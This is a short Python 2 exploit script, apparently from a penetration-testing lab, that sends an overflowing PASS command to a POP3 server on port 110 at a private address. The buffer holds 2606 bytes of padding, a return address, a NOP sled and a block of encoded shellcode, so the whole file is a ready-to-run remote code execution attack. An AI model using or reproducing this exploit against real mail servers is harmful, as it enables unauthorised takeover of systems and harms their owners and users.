#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xba\xdb\xe8\x27\x02\xda\xd1\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x56\x12\x83\xc6\x04\x03\x8d\xe6\xc5\xf7\xcd\x1f\x8b"
"\xf8\x2d\xe0\xec\x71\xc8\xd1\x2c\xe5\x99\x42\x9d\x6d\xcf\x6e"
"\x56\x23\xfb\xe5\x1a\xec\x0c\x4d\x90\xca\x23\x4e\x89\x2f\x22"
"\xcc\xd0\x63\x84\xed\x1a\x76\xc5\x2a\x46\x7b\x97\xe3\x0c\x2e"
"\x07\x87\x59\xf3\xac\xdb\x4c\x73\x51\xab\x6f\x52\xc4\xa7\x29"
"\x74\xe7\x64\x42\x3d\xff\x69\x6f\xf7\x74\x59\x1b\x06\x5c\x93"
"\xe4\xa5\xa1\x1b\x17\xb7\xe6\x9c\xc8\xc2\x1e\xdf\x75\xd5\xe5"
"\x9d\xa1\x50\xfd\x06\x21\xc2\xd9\xb7\xe6\x95\xaa\xb4\x43\xd1"
"\xf4\xd8\x52\x36\x8f\xe5\xdf\xb9\x5f\x6c\x9b\x9d\x7b\x34\x7f"
"\xbf\xda\x90\x2e\xc0\x3c\x7b\x8e\x64\x37\x96\xdb\x14\x1a\xff"
"\x28\x15\xa4\xff\x26\x2e\xd7\xcd\xe9\x84\x7f\x7e\x61\x03\x78"
"\x81\x58\xf3\x16\x7c\x63\x04\x3f\xbb\x37\x54\x57\x6a\x38\x3f"
"\xa7\x93\xed\x90\xf7\x3b\x5e\x51\xa7\xfb\x0e\x39\xad\xf3\x71"
"\x59\xce\xd9\x19\xf0\x35\x8a\x2f\x0e\x35\xc9\x58\x12\x35\xcc"
"\x23\x9b\xd3\xa4\x43\xca\x4c\x51\xfd\x57\x06\xc0\x02\x42\x63"
"\xc2\x89\x61\x94\x8d\x79\x0f\x86\x7a\x8a\x5a\xf4\x2d\x95\x70"
"\x90\xb2\x04\x1f\x60\xbc\x34\x88\x37\xe9\x8b\xc1\xdd\x07\xb5"
"\x7b\xc3\xd5\x23\x43\x47\x02\x90\x4a\x46\xc7\xac\x68\x58\x11"
"\x2c\x35\x0c\xcd\x7b\xe3\xfa\xab\xd5\x45\x54\x62\x89\x0f\x30"
"\xf3\xe1\x8f\x46\xfc\x2f\x66\xa6\x4d\x86\x3f\xd9\x62\x4e\xc8"
"\xa2\x9e\xee\x37\x79\x1b\x0e\xda\xab\x56\xa7\x43\x3e\xdb\xaa"
"\x73\x95\x18\xd3\xf7\x1f\xe1\x20\xe7\x6a\xe4\x6d\xaf\x87\x94"
"\xfe\x5a\xa7\x0b\xfe\x4e")

buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

try:
	print "\nSending evil buffer..."
	connect=s.connect(('10.11.24.85', 110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
finally:
	s.close()
